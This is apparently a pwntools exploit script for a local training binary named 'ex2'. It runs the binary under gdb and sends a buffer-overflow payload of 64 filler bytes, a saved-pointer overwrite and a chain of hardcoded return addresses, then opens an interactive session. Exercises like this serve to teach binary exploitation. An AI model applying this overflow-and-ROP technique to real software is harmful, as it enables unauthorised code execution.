from pwn import *


context.arch = "amd64"
io = gdb.debug(
    "./bin/ex2",
    """
    break ex2.c:32
    continue
    """,
    terminal=["gnome-terminal", "--geometry=160x80", "-e"],
)


io.sendline(
    b"A" * 64
    + b"B" * 8
    + p64(0x000000000040125C)
    + b"\0" * 8
    + p64(0x404038)
    + b"B" * 8
    + p64(0x4012E6)
)
io.interactive()
